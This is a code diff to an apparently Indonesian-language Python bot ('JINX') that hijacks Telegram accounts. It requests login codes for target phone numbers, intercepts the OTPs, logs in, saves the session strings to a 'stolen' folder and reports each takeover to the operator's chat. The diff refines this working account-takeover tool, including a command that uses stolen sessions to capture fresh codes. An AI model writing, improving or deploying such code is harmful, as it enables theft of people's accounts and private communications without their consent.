@@ -16,8 +16,8 @@ client = TelegramClient('jinx', API_ID, API_HASH)
 listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 
-@app.post("/start_listen")
-async def start_listen(req: Request):
+@app.post("/start_listener")
+async def start_listener(req: Request):
     data = await req.json()
     phone = data['phone']
 
@@ -26,14 +26,13 @@ async def start_listen(req: Request):
     sent = await temp.send_code_request(phone)
     listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}
 
-    # INTERCEPTOR OTOMATIS
     @temp.on(events.NewMessage(incoming=True))
     async def handler(event):
-        if event.is_private and OTP_PATTERN.search(event.message.message):
+        if OTP_PATTERN.search(event.message.message):
             code = OTP_PATTERN.search(event.message.message).group(1)
             await auto_login(phone, code, source="interceptor")
 
-    await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP (web/bot)...")
+    await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
     return {"success": True}
 
 @app.post("/submit_otp")
@@ -59,19 +58,24 @@ async def auto_login(phone, code, source="unknown"):
         with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
             f.write(session_str)
 
-        msg = f"SESSION DICURI!\nSumber: {source.upper()}\nOTP: `{code}`\nUser: {me.first_name}\n/login {phone}"
+        msg = f"""
+OTP DITERIMA: `{code}` ({source.upper()})
+SESSION DICURI!
+User: {me.first_name}
+Phone: `{phone}`
+/login {phone}
+        """.strip()
         await client.send_message(CHAT_ID, msg)
         del listening[phone]
     except Exception as e:
         await client.send_message(CHAT_ID, f"Gagal: {str(e)}")
 
-# /new_otp
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     phone = event.pattern_match.group(1)
     session_file = f"stolen/{phone.replace('+','')}.session"
     if not os.path.exists(session_file):
-        await event.reply("Session tidak ada!")
+        await event.reply("Session nggak ada!")
         return
     
     session_str = open(session_file).read()
@@ -80,14 +84,15 @@ async def new_otp(event):
     await stolen.start()
     
     try:
-        await stolen.send_code_request(phone)
+        result = await stolen.send_code_request(phone)
         await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
-        # Mulai listen lagi
-        listening[phone] = {'client': stolen, 'hash': None}
+        
+        listening[phone] = {'client': stolen, 'hash': result.phone_code_hash}
         @stolen.on(events.NewMessage(incoming=True))
         async def handler(e):
-            if OTP_PATTERN.search(e.message.message):
-                code = OTP_PATTERN.search(e.message.message).group(1)
+            match = OTP_PATTERN.search(e.message.message)
+            if match:
+                code = match.group(1)
                 await event.reply(f"OTP BARU: `{code}`")
     except Exception as e:
         await event.reply(f"Gagal: {str(e)}")
@@ -95,4 +100,4 @@ async def new_otp(event):
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX HYBRID BOT HIDUP!")
+    print("JINX OTP BOT HIDUP!")
